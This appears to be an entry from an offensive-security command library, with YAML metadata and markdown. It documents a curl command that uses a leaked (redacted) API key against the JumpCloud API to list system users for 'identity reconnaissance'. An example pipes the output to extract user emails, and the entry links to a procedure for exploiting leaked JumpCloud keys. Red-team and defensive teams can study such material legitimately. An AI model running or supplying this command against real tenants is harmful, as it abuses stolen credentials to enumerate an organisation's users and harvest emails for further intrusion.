---
data: 'curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"'
tags:
  - api-enumeration
  - jumpcloud
  - user-discovery
type: command
executor: bash
platforms:
  - Cloud
id: 623368d9-a61c-43bd-95be-d8e26c168225
created_at: '2025-12-14T17:32:48.646Z'
updated_at: '2025-12-14T17:32:48.646Z'
verified: false
validated: true
submitted: true
---
# curl-list-jumpcloud-system-users

## Command

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"
```

## Description

This command retrieves a list of system users from the JumpCloud API using the leaked key, aiding in identity reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-api-key: KEY"` | Authentication header with leaked key | Yes |
| `URL` | Endpoint for system users | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"
```

### Advanced Usage

Save output for analysis:

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers" | jq '.[] | .email'
```

## Expected Output

JSON array of user objects including emails, IDs, and roles.

## Related

- [[commands/curl-list-jumpcloud-systems]]
- [[procedures/Exploit-Leaked-JumpCloud-API-Key]]
